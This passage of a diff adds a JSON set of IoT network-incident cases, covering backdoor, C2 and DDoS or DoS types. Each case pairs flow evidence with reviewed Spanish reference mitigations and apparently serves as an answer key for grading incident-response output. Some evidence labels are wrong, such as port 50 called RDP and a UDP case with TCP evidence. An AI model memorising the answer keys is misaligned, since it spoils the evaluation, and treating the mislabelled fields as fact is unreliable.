@@ -1,0 +1,2002 @@
+{
+  "cases": [
+    {
+      "attack_type": "Backdoor",
+      "case_id": "case-mitlive-01-e15e8e07",
+      "dataset_origin": "edge_iiotset",
+      "evidence": {
+        "anomaly_summary": "TCP packet with ACK flag set, no SYN/FIN/RST flags, indicating an established connection segment with payload data.",
+        "byte_count": 208,
+        "dst_ip": "192.168.0.170",
+        "dst_port": 4321,
+        "event_id": "tcp_flow_2021_20_58_51_204052000",
+        "missing_fields": [
+          "app_proto",
+          "packet_count",
+          "duration_ms"
+        ],
+        "modality": "network_flow",
+        "schema_profile": "network_packet",
+        "semantic_text": "TCP packet from 192.168.0.128:60210 to 192.168.0.170:4321 with ACK flag, sequence number 2070481, acknowledgment number 2213215181, payload length 208 bytes, and TCP options present.",
+        "service_context": {
+          "tcp": {
+            "ack": true,
+            "fin": false,
+            "flags": "24",
+            "rst": false,
+            "syn": false,
+            "synack": false
+          }
+        },
+        "src_ip": "192.168.0.128",
+        "src_port": 60210,
+        "traffic_direction": "outbound",
+        "transport_proto": "TCP"
+      },
+      "references": [
+        {
+          "base": "aislar el dispositivo con indicios de backdoor de la red operativa",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Aislar cautelarmente 192.168.0.128 mientras se valida el segmento TCP saliente con carga hacia 192.168.0.170:4321, sin asumir compromiso a partir de un solo paquete.",
+          "reference_id": "case-mitlive-01-e15e8e07::mitigation::00"
+        },
+        {
+          "base": "bloquear las comunicaciones salientes y transferencias asociadas con la puerta trasera",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Restringir de forma cautelar la comunicación TCP observada de 192.168.0.128:60210 a 192.168.0.170:4321, sin extender el bloqueo a destinos no presentes en la evidencia.",
+          "reference_id": "case-mitlive-01-e15e8e07::mitigation::01"
+        },
+        {
+          "base": "eliminar la persistencia y reflashear o restaurar el firmware desde una imagen confiable",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Examinar la persistencia en 192.168.0.128 y reflashear o restaurar solo si se confirma una alteración, pues el paquete ACK con 208 bytes no demuestra cambios de firmware.",
+          "reference_id": "case-mitlive-01-e15e8e07::mitigation::02"
+        },
+        {
+          "base": "verificar firma e integridad del firmware antes de cada despliegue",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Verificar la firma y la integridad del firmware de 192.168.0.128 antes de desplegarlo de nuevo, como control complementario al análisis del flujo TCP observado.",
+          "reference_id": "case-mitlive-01-e15e8e07::mitigation::03"
+        },
+        {
+          "base": "aplicar antimalware o listas de aplicaciones permitidas en los equipos compatibles",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Aplicar antimalware o listas de aplicaciones permitidas en 192.168.0.128 si el equipo es compatible y revisar qué proceso originó la conexión TCP al puerto 4321.",
+          "reference_id": "case-mitlive-01-e15e8e07::mitigation::04"
+        },
+        {
+          "base": "capturar muestra de paquetes",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Capturar paquetes del flujo 192.168.0.128:60210 a 192.168.0.170:4321 para examinar la carga de 208 bytes y el contexto de la sesión.",
+          "reference_id": "case-mitlive-01-e15e8e07::mitigation::05"
+        },
+        {
+          "base": "inspeccionar anomalias de protocolo",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Inspeccionar el segmento TCP con ACK activo, sin SYN, FIN ni RST, y contrastar su secuencia, acuse y carga con la sesión correspondiente.",
+          "reference_id": "case-mitlive-01-e15e8e07::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "Command_and_Control",
+      "case_id": "case-mitlive-16-a9ff1d2b",
+      "dataset_origin": "iot23",
+      "evidence": {
+        "anomaly_summary": "Conexión TCP efímera desde red local a puerto 50 (RDP) con estado de conexión fallida (S0) y bajo volumen de tráfico.",
+        "byte_count": 180,
+        "dst_ip": "128.185.250.50",
+        "dst_port": 50,
+        "duration_ms": 3157.444,
+        "event_id": "CaFLJtR4P7QnUPOx8",
+        "modality": "network_flow",
+        "packet_count": 3,
+        "schema_profile": "network_flow",
+        "semantic_text": "Se detectó un flujo de red TCP desde la IP local 192.168.100.113 (puerto origen 37884) hacia la IP externa 128.185.250.50 (puerto destino 50) con protocolo TCP. El flujo duró 3.157 segundos, transmitió 180 bytes en 3 paquetes y terminó en estado de conexión fallida (S0).",
+        "service_context": {
+          "tunnel_parents": "(empty)"
+        },
+        "src_ip": "192.168.100.113",
+        "src_port": 37884,
+        "traffic_direction": "outbound",
+        "transport_proto": "tcp"
+      },
+      "references": [
+        {
+          "base": "aislar el dispositivo que mantiene comunicaciones de mando y control",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Aislar 192.168.100.113 solo si la correlación confirma mando y control; el evento muestra un intento TCP fallido de tres paquetes.",
+          "reference_id": "case-mitlive-16-a9ff1d2b::mitigation::00"
+        },
+        {
+          "base": "bloquear los dominios, direcciones, puertos y protocolos C2 observados",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Bloquear, si se valida como indicador C2, la comunicación TCP hacia 128.185.250.50:50; el evento no aporta dominios.",
+          "reference_id": "case-mitlive-16-a9ff1d2b::mitigation::01"
+        },
+        {
+          "base": "eliminar la persistencia y reflashear el dispositivo desde firmware confiable",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Buscar persistencia y valorar el reflasheo solo si el análisis del dispositivo confirma compromiso; el estado S0 no lo demuestra.",
+          "reference_id": "case-mitlive-16-a9ff1d2b::mitigation::02"
+        },
+        {
+          "base": "rotar credenciales y claves potencialmente expuestas por el canal C2",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Rotar credenciales o claves únicamente si aparecen indicios de exposición; el flujo fallido de 180 bytes no los aporta.",
+          "reference_id": "case-mitlive-16-a9ff1d2b::mitigation::03"
+        },
+        {
+          "base": "aplicar listas permitidas de salida y prevencion de intrusiones para trafico C2",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Restringir mediante lista permitida la salida TCP a 128.185.250.50:50 y detectar ese patrón solo si se valida como C2.",
+          "reference_id": "case-mitlive-16-a9ff1d2b::mitigation::04"
+        },
+        {
+          "base": "segmentar los dispositivos y eliminar servicios y credenciales por defecto",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Revisar la segmentación, los servicios y las credenciales por defecto de 192.168.100.113 sin atribuir el flujo a un servicio no identificado.",
+          "reference_id": "case-mitlive-16-a9ff1d2b::mitigation::05"
+        },
+        {
+          "base": "capturar ventana de flujo para evidencia",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Conservar la ventana del flujo TCP saliente de 3,157 segundos, tres paquetes y 180 bytes, incluido su estado S0.",
+          "reference_id": "case-mitlive-16-a9ff1d2b::mitigation::06"
+        },
+        {
+          "base": "revisar politica de red del segmento",
+          "item_index": 7,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Comprobar si la política del segmento permite conexiones TCP salientes desde 192.168.100.113 hacia 128.185.250.50:50.",
+          "reference_id": "case-mitlive-16-a9ff1d2b::mitigation::07"
+        }
+      ]
+    },
+    {
+      "attack_type": "DDoS_HTTP",
+      "case_id": "case-mitlive-02-fbe16540",
+      "dataset_origin": "edge_iiotset",
+      "evidence": {
+        "anomaly_summary": "TCP packet with ACK flag set from 192.168.0.170:44538 to 192.168.0.128:80, payload of 21 bytes, no SYN/FIN/RST flags indicating established connection.",
+        "app_proto": "HTTP",
+        "byte_count": 21,
+        "dst_ip": "192.168.0.128",
+        "dst_port": 80,
+        "event_id": "evt_2021113907935300000_192.168.0.170_192.168.0.128",
+        "modality": "network_flow",
+        "packet_count": 1,
+        "schema_profile": "network_packet",
+        "semantic_text": "TCP packet detected from source IP 192.168.0.170 port 44538 to destination IP 192.168.0.128 port 80. Packet has ACK flag set, sequence number 720, acknowledgment number 3737781222, payload length 21 bytes, and TCP options '0101080a0aa7d3e41dd828b1'. No SYN, FIN, or RST flags present, indicating an established connection.",
+        "src_ip": "192.168.0.170",
+        "src_port": 44538,
+        "traffic_direction": "outbound",
+        "transport_proto": "TCP"
+      },
+      "references": [
+        {
+          "base": "aplicar rate limiting de peticiones HTTP por origen, ruta y cliente",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Aplicar límites prudentes al tráfico HTTP desde 192.168.0.170 hacia 192.168.0.128:80, sin fijarlos por ruta porque la evidencia no incluye ninguna ruta ni volumen agregado.",
+          "reference_id": "case-mitlive-02-fbe16540::mitigation::00"
+        },
+        {
+          "base": "activar proteccion DDoS, WAF o proxy inverso delante del servicio HTTP afectado",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Proteger con WAF, proxy inverso o mitigación DDoS el servicio HTTP de 192.168.0.128:80 si el análisis confirma presión sobre él, ya que aquí solo consta un paquete.",
+          "reference_id": "case-mitlive-02-fbe16540::mitigation::01"
+        },
+        {
+          "base": "bloquear temporalmente los origenes persistentes confirmados por la evidencia del flujo",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "No tratar 192.168.0.170 como origen persistente por este único paquete; bloquearlo temporalmente solo si flujos adicionales confirman recurrencia dañina.",
+          "reference_id": "case-mitlive-02-fbe16540::mitigation::02"
+        },
+        {
+          "base": "definir limites de conexiones y solicitudes concurrentes en el servicio web",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Definir límites de conexiones y solicitudes concurrentes para 192.168.0.128:80 a partir de su línea base; este único paquete ACK es compatible con una conexión ya establecida, pero no permite estimar la concurrencia.",
+          "reference_id": "case-mitlive-02-fbe16540::mitigation::03"
+        },
+        {
+          "base": "usar cache, balanceo y capacidad upstream para absorber picos de peticiones HTTP",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Dimensionar caché, balanceo y capacidad upstream del servicio 192.168.0.128:80 con métricas históricas, porque el evento de 21 bytes no acredita un pico HTTP.",
+          "reference_id": "case-mitlive-02-fbe16540::mitigation::04"
+        },
+        {
+          "base": "capturar muestra de paquetes",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Capturar paquetes alrededor del flujo 192.168.0.170:44538 a 192.168.0.128:80 para identificar la petición HTTP y su secuencia de sesión.",
+          "reference_id": "case-mitlive-02-fbe16540::mitigation::05"
+        },
+        {
+          "base": "inspeccionar anomalias de protocolo",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Inspeccionar el paquete TCP al puerto HTTP con ACK activo, 21 bytes de carga y ausencia de SYN, FIN y RST, y comprobar si pertenece a una sesión ya establecida.",
+          "reference_id": "case-mitlive-02-fbe16540::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "DDoS_ICMP",
+      "case_id": "case-mitlive-03-cc5370e4",
+      "dataset_origin": "edge_iiotset",
+      "evidence": {
+        "anomaly_summary": "Tráfico ICMP detectado entre host externo e interno con secuencia y checksum registrados. Posible escaneo o actividad de red no confirmada.",
+        "app_proto": "icmp",
+        "dst_ip": "192.168.0.128",
+        "event_id": "evt_20211231_231820_464147_000",
+        "missing_fields": [
+          "src_port",
+          "dst_port",
+          "transport_proto",
+          "packet_count",
+          "byte_count",
+          "duration_ms"
+        ],
+        "modality": "network_flow",
+        "schema_profile": "network_packet",
+        "semantic_text": "Paquete ICMP recibido desde 153.75.209.162 hacia 192.168.0.128 con secuencia 21809 y checksum 32675. No se detectan puertos ni protocolo de transporte explícito. Presencia de flags ARP y TCP en el contexto de la captura.",
+        "service_context": {
+          "icmp": {
+            "checksum": 32675,
+            "sequence": 21809
+          }
+        },
+        "src_ip": "153.75.209.162",
+        "traffic_direction": "ingress"
+      },
+      "references": [
+        {
+          "base": "limitar la tasa de trafico ICMP en el perimetro y en el segmento afectado",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Limitar con prudencia la tasa ICMP de entrada hacia 192.168.0.128 en el perímetro, calibrándola con más tráfico porque la evidencia no aporta volumen.",
+          "reference_id": "case-mitlive-03-cc5370e4::mitigation::00"
+        },
+        {
+          "base": "filtrar upstream los tipos ICMP no necesarios durante la inundacion",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Identificar primero el tipo ICMP observado y solicitar filtrado upstream solo para tipos no necesarios si capturas adicionales confirman una inundación, que este registro sin datos de volumen ni duración no permite establecer.",
+          "reference_id": "case-mitlive-03-cc5370e4::mitigation::01"
+        },
+        {
+          "base": "bloquear los origenes persistentes y retirar reglas temporales cuando finalice el incidente",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "No considerar persistente a 153.75.209.162 por un solo paquete; bloquearlo temporalmente únicamente si capturas posteriores confirman recurrencia perjudicial.",
+          "reference_id": "case-mitlive-03-cc5370e4::mitigation::02"
+        },
+        {
+          "base": "permitir unicamente los tipos y tasas ICMP necesarios para la operacion",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Restringir hacia 192.168.0.128 los tipos y tasas ICMP a los necesarios para operar, tras identificar el tipo que la evidencia no especifica.",
+          "reference_id": "case-mitlive-03-cc5370e4::mitigation::03"
+        },
+        {
+          "base": "establecer alertas de volumen ICMP por dispositivo y segmento",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Establecer alertas de volumen ICMP para 192.168.0.128 y su segmento usando una línea base, ya que el registro carece de recuento y duración.",
+          "reference_id": "case-mitlive-03-cc5370e4::mitigation::04"
+        },
+        {
+          "base": "capturar muestra de paquetes",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Capturar paquetes ICMP adyacentes al evento entre 153.75.209.162 y 192.168.0.128 para determinar tipo, frecuencia y respuestas.",
+          "reference_id": "case-mitlive-03-cc5370e4::mitigation::05"
+        },
+        {
+          "base": "inspeccionar anomalias de protocolo",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Inspeccionar el paquete ICMP con secuencia 21809 y checksum 32675 y aclarar la presencia contextual de indicadores ARP y TCP sin inferir un escaneo.",
+          "reference_id": "case-mitlive-03-cc5370e4::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "DDoS_TCP",
+      "case_id": "case-mitlive-04-0b1a613a",
+      "dataset_origin": "edge_iiotset",
+      "evidence": {
+        "anomaly_summary": "TCP SYN packet from external IP to internal host on port 80 with payload data.",
+        "app_proto": "HTTP",
+        "byte_count": 120,
+        "dst_ip": "192.168.0.128",
+        "dst_port": 80,
+        "event_id": "evt_2021190305449553000_191.242.186.1_192.168.0.128_30781_80",
+        "modality": "network_flow",
+        "schema_profile": "network_packet",
+        "semantic_text": "A TCP SYN packet was transmitted from source IP 191.242.186.1 to destination IP 192.168.0.128 on port 80 with a payload length of 120 bytes. The packet includes TCP flags indicating a SYN connection initiation.",
+        "service_context": {
+          "tcp": {
+            "checksum": 13245,
+            "flags": "SYN",
+            "payload_length": 120
+          }
+        },
+        "src_ip": "191.242.186.1",
+        "src_port": 30781,
+        "traffic_direction": "outbound",
+        "transport_proto": "TCP"
+      },
+      "references": [
+        {
+          "base": "activar SYN cookies y limitar nuevas conexiones TCP por origen",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Activar SYN cookies en 192.168.0.128:80 y limitar nuevas conexiones TCP por origen con umbrales basados en más flujos, pues aquí solo consta un SYN.",
+          "reference_id": "case-mitlive-04-0b1a613a::mitigation::00"
+        },
+        {
+          "base": "derivar el trafico TCP anomalo a filtrado o scrubbing upstream",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Derivar a filtrado upstream el tráfico TCP anómalo hacia 192.168.0.128:80 solo si se confirma un volumen dañino más allá del SYN observado.",
+          "reference_id": "case-mitlive-04-0b1a613a::mitigation::01"
+        },
+        {
+          "base": "bloquear los origenes persistentes confirmados y eliminar sesiones TCP incompletas",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "No bloquear 191.242.186.1 por persistencia con este único SYN; revisar la tabla de estado y eliminar únicamente sesiones incompletas confirmadas.",
+          "reference_id": "case-mitlive-04-0b1a613a::mitigation::02"
+        },
+        {
+          "base": "ajustar colas y tiempos de espera de conexion para evitar agotamiento de recursos",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Ajustar colas y tiempos de espera de conexión en 192.168.0.128:80 tras medir sesiones incompletas, dado que el evento no informa de agotamiento.",
+          "reference_id": "case-mitlive-04-0b1a613a::mitigation::03"
+        },
+        {
+          "base": "monitorizar tasas SYN, conexiones incompletas y reinicios por servicio",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Monitorizar en el servicio HTTP de 192.168.0.128:80 la tasa de SYN, las conexiones incompletas y los reinicios, usando este SYN con carga como evento de análisis.",
+          "reference_id": "case-mitlive-04-0b1a613a::mitigation::04"
+        },
+        {
+          "base": "capturar muestra de paquetes",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Capturar paquetes alrededor del flujo 191.242.186.1:30781 a 192.168.0.128:80 para comprobar la negociación y las posibles respuestas.",
+          "reference_id": "case-mitlive-04-0b1a613a::mitigation::05"
+        },
+        {
+          "base": "inspeccionar anomalias de protocolo",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Inspeccionar el SYN TCP dirigido al servicio HTTP en 192.168.0.128:80, con 120 bytes de carga y checksum 13245, dentro del contexto del establecimiento de la conexión TCP.",
+          "reference_id": "case-mitlive-04-0b1a613a::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "DDoS_UDP",
+      "case_id": "case-mitlive-05-0790f401",
+      "dataset_origin": "edge_iiotset",
+      "evidence": {
+        "anomaly_summary": "Tráfico TCP de origen local con flags de conexión activas (SYN) y posible uso de HTTP/MQTT. Falta contexto de destino para evaluar riesgo.",
+        "app_proto": "http",
+        "event_id": "evt_20240614_001",
+        "missing_fields": [
+          "dst_ip",
+          "dst_port",
+          "packet_count",
+          "byte_count",
+          "duration_ms",
+          "ts"
+        ],
+        "modality": "network_flow",
+        "schema_profile": "network_packet",
+        "semantic_text": "Paquete TCP de origen 192.168.0.128:puerto 6476 hacia destino desconocido con flags SYN activas. Posible inicio de conexión HTTP/MQTT. No se detectan flags RST/FIN. No hay evidencia de tráfico de respuesta.",
+        "service_context": {
+          "protocols": [
+            "tcp",
+            "http"
+          ]
+        },
+        "src_ip": "192.168.0.128",
+        "src_port": 6476,
+        "traffic_direction": "outbound",
+        "transport_proto": "tcp"
+      },
+      "references": [
+        {
+          "base": "limitar o descartar el trafico UDP dirigido al servicio afectado",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Validar tráfico UDP antes de limitarlo o descartarlo, porque la evidencia disponible solo muestra un SYN TCP desde 192.168.0.128:6476 y no identifica destino.",
+          "reference_id": "case-mitlive-05-0790f401::mitigation::00"
+        },
+        {
+          "base": "solicitar filtrado anti-spoofing y mitigacion upstream durante la inundacion",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Solicitar filtrado anti-spoofing y mitigación upstream solo si se confirma una inundación, ya que el evento observado es un inicio TCP sin respuesta ni destino conocido.",
+          "reference_id": "case-mitlive-05-0790f401::mitigation::01"
+        },
+        {
+          "base": "bloquear los origenes persistentes y revisar posibles servicios usados para amplificacion",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "No atribuir persistencia ni amplificación a 192.168.0.128 por este único SYN TCP; revisar servicios UDP solo si nueva evidencia los identifica.",
+          "reference_id": "case-mitlive-05-0790f401::mitigation::02"
+        },
+        {
+          "base": "cerrar servicios UDP innecesarios y restringir los restantes mediante listas de control",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Inventariar los servicios UDP solo después de identificar en capturas adicionales el flujo y el extremo afectados; la evidencia actual describe TCP y carece de destino.",
+          "reference_id": "case-mitlive-05-0790f401::mitigation::03"
+        },
+        {
+          "base": "establecer baselines y alertas de volumen UDP por puerto y dispositivo",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Establecer líneas base y alertas de volumen para el servicio UDP que llegue a identificarse; no usar este evento TCP sin destino ni volumen como referencia UDP.",
+          "reference_id": "case-mitlive-05-0790f401::mitigation::04"
+        }
+      ]
+    },
+    {
+      "attack_type": "DoS",
+      "case_id": "case-mitlive-15-32fa99ad",
+      "dataset_origin": "bot_iot",
+      "evidence": {
+        "anomaly_summary": "Flujo UDP de 8 paquetes (480 bytes) desde 192.168.100.148:51647 hacia 192.168.100.6:80 con flags 'e' y estado 'INT' en 24.98 segundos.",
+        "byte_count": 480,
+        "dst_ip": "192.168.100.6",
+        "dst_port": 80,
+        "duration_ms": 24975.981,
+        "event_id": "1076895",
+        "modality": "network_flow",
+        "packet_count": 8,
+        "schema_profile": "network_flow",
+        "semantic_text": "Flujo de red UDP detectado con origen en 192.168.100.148 (puerto 51647) y destino en 192.168.100.6 (puerto 80). Transmitió 8 paquetes (480 bytes) en 24.98 segundos con flags 'e' y estado 'INT'. Estadísticas adicionales incluyen tasa de transferencia (0.280269), bytes totales por IP (48000) y métricas de paquetes por protocolo/puerto.",
+        "service_context": {
+          "port": 80,
+          "protocol": "udp"
+        },
+        "src_ip": "192.168.100.148",
+        "src_port": 51647,
+        "transport_proto": "udp"
+      },
+      "references": [
+        {
+          "base": "aislar el servicio o dispositivo afectado y aplicar limites de consumo por origen",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Aplicar límites prudentes al origen 192.168.100.148 sobre el servicio UDP de 192.168.100.6:80 y aislarlo solo si se observa impacto operativo.",
+          "reference_id": "case-mitlive-15-32fa99ad::mitigation::00"
+        },
+        {
+          "base": "activar degradacion controlada, cola o failover para mantener las funciones esenciales",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Activar degradación controlada, cola o failover en 192.168.100.6:80 si la monitorización confirma presión de recursos, no demostrada por el flujo de 8 paquetes.",
+          "reference_id": "case-mitlive-15-32fa99ad::mitigation::01"
+        },
+        {
